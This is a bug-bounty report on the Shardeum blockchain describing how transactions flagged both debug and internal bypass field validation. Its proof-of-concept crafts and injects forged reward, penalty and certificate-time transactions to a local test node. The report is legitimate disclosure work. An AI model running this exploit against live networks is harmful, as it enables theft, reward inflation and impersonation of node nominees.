# #35695 \[BC-Critical] validateTxnFields check for internal transactions can be bypassed

**Submitted on Oct 3rd 2024 at 18:54:49 UTC by @Merkle\_Bonsai for** [**Audit Comp | Shardeum: Core II**](https://immunefi.com/audit-competition/shardeum-core-ii-boost)

* **Report ID:** #35695
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardeum/tree/dev>
* **Impacts:**
  * Direct loss of funds
  * Permanent freezing of funds (fix requires hardfork)

## Description

## Brief/Intro

\`validateTxnFields\` can be bypassed by sending transaction that has both \`isDebugTx\` and \`isInternalTx\` flags. This allows to ignore several checks in multiple internal TX calls.

This is multiple vulnerabilities sharing same vector, so I'm reporting it all together. I will appreciate if they will be taken into resulting score separately. I decided to report them together, as it provides the whole picture, being more valuable for project.

## Vulnerability Details

All logic parts in app are working by logic "if internal, then X, else if debug, then Y, else Z". However, validateTxnFields breaks that rule, doing "if debug, then X, else if internal, then Y, else Z". That allows attacker node to bypass following impactful checks:

* for \`InternalTXType.InitRewardTimes\`: \`tx.nodeActivatedTime\` is between 0 and current timestamp (yet it still should be <= \`nodeAccount.rewardStartTime\`)
* for \`InternalTXType.ClaimReward\`: \`tx.deactivatedNodeId\` is actually deactivated
* for \`InternalTXType.Penalty\`: \`tx.violationType\` is within range, \`tx.violationData\` exists. Yet, it is double-executed inside \`applyPenaltyTX\`, protecting from bad things to happen.
* for \`InternalTXType.SetCertTime\`: signature belongs to nominee, duration is correct

## Impact Details

For \`InitRewardTimes\`, it theoretically allows to set negative \`rewardStartTime\`, allowing to get very large rewards (yet I wasn't able to execute it) For \`ClaimReward\`, it is possible to unstake while node is still working, and pass negative \`nodeDeactivatedTime\`. This can potentially be very impactful when used together with negative \`rewardStartTime\` of \`InitRewardTimes\` tx. For \`SetCertTime\`, \`duration\` is overridden, so it's not possible to explicitly trick it, but skipped signature check allows to impersonate \`nominee\`, taking bits from target user infinitely (and for free), and also preventing specific nominator from unstaking

## Recommendations

1. fix order of \`validateTxnFields\`
2. disallow transactions being both debug and internal, considering them definitely faulty

## Proof of Concept

## Proof of Concept

Please note that this PoC demonstrates multiple attacks at same time - sadly, any other code example will be larger and more verbose. This PoC is partially shared with my other report ("Specifically crafted penalty TX may cause total network shutdown"), however, it is simplest way to demonstrate the attack vector described above. certTime as a call is added here.

Since this requires some manually observed delay, attack is done in several steps, with switching the step iterationally (stake-init-penalty or stake-init-certTime).

I'm using 10-node configuration, production mode, with only account \`0xCf551a61548863765bf635feaAa2501636B91908\` added to genesis and change in \`getExternalApiMiddleware\`, that allows to use node 9005 without auth: \`\`\` export const getExternalApiMiddleware = () => { return (req, res, next): unknown => { const { path, method } = req

```
let isAllowed &#x3D; true // Default to true
const isBadNode &#x3D; p2pSelf.getThisNodeInfo().externalPort &#x3D;&#x3D;&#x3D; 9005
if (isBadNode) {
  next()
  return
}
...
```

\`\`\`

\`\`\` const keypair = JSON.parse(await fs.readFile('../instances/shardus-instance-9005/secrets.json'))

const provider = new ethers.JsonRpcProvider('<http://localhost:8080>', 8082, { batchMaxCount: 1 }) const walletWithProvider = new ethers.Wallet( '0x82beccb10f7c4552334dbf1d778a88d7749656fc329ca4ea4c66f714ed7760fb', provider ) // address 0xCf551a61548863765bf635feaAa2501636B91908 console.log('address', walletWithProvider.address) const stakeRequired = BigInt('0x8ac7230489e80000')

enum Step { stake, init, unstake, penalty, certTime }

const step = Step.penalty

switch (step) { case Step.stake: { const raw = await walletWithProvider.signTransaction({ to: '0x0000000000000000000000000000000000010000', gasPrice: '30000', gasLimit: 30000000, value: stakeRequired, chainId: 8082, data: ethers.hexlify( ethers.toUtf8Bytes( JSON.stringify({ isInternalTx: true, internalTXType: InternalTXType.Stake, nominator: walletWithProvider.address.toLowerCase(), timestamp: Date.now(), nominee: keypair.publicKey, stake: { dataType: 'bi', value: stakeRequired.toString(16) }, }) ) ), nonce: await walletWithProvider.getNonce(), }) await post('<http://127.0.0.1:9005/inject>', { raw, timestamp: Date.now(), appDataOverride: { networkAccount: networkAccount, }, }) break } case Step.init: { await post( '<http://127.0.0.1:9005/inject>', crypto.signObj( { publicKey: keypair.publicKey, isDebugTx: true, isInternalTx: true, internalTXType: InternalTXType.InitRewardTimes, nominee: keypair.publicKey, nodeActivatedTime: 1, timestamp: Date.now() - 5 \* 60000, // should be quite in the past }, keypair.secretKey, keypair.publicKey ) ) break } case Step.penalty: { await post( '<http://127.0.0.1:9005/inject>', crypto.signObj( { publicKey: keypair.publicKey, isDebugTx: true, isInternalTx: true, internalTXType: InternalTXType.Penalty, reportedNodePublickKey: keypair.publicKey, operatorEVMAddress: walletWithProvider.address, timestamp: -1, }, keypair.secretKey, keypair.publicKey ) ) break; } case Step.certTime: { await post( '<http://127.0.0.1:9005/inject>', crypto.signObj( { publicKey: keypair.publicKey, isDebugTx: true, // without this flag it will cause "Invalid signature for SetCertTime tx" error due to incorrect nominee isInternalTx: true, internalTXType: InternalTXType.SetCertTime, nominator: walletWithProvider.address, nominee: keypair9001.publicKey, nodeActivatedTime: Date.now(), timestamp: Date.now(), }, keypair.secretKey, keypair.publicKey ) ) break } } \`\`\`
